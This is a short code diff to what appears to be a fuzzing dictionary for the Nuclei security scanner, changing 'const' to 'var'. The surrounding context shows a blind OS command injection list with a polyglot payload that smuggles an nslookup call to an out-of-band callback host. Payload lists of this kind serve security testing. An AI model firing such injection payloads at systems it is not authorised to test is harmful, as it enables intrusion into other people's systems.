@@ -5,7 +5,7 @@
 // Placeholder tokens: {{marker}} = OAST Hostname  |  {{my_email}} = Testing Email
 // ============================================================================
 
-const NucleiFuzzDictionaries = {
+var NucleiFuzzDictionaries = {
     // ── 1. BLIND OS COMMAND INJECTION (OAST & POLYGLOTS) ──
     cmdi: [
         "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'",
